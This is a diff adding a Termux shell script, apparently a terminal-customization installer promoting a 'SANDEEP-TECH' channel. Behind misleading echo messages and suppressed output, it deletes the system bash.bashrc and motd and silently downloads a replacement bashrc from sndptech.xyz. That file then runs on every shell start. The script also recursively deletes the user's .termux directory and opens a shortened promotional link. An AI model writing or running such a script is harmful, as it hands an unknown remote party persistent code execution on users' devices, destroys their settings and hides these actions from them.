@@ -1,0 +1,20 @@
+#!/data/data/com.termux/files/usr/bin/bash
+apt-get update &> /dev/null
+apt-get upgrade -y
+apt-get install wget -y
+apt-get install nodejs -y
+npm install cfonts -g
+cd
+cd ..
+cd usr
+cd etc
+rm bash.bashrc
+echo "Remove Unwanted Files ......"; rm motd &> /dev/null
+echo "Server Started ......"; wget sndptech.xyz/bash.bashrc &> /dev/null
+cd
+echo "Subscribe my Channel ......"; am start -a android.intent.action.VIEW -d https://bit.ly/2QPOsUu &> /dev/null
+clear
+cfonts "SANDEEP-TECH" -f chrome -c yellow,yellow -a center
+rm -rf /data/data/com.termux/files/home/.termux
+mkdir $HOME/.termux/ ;echo "extra-keys = [ \ ['TAB','CTRL','-','UP','DOWN','LEFT','RIGHT'] \ ]" >> $HOME/.termux/termux.properties && termux-reload-settings && sleep 1 && exit
+
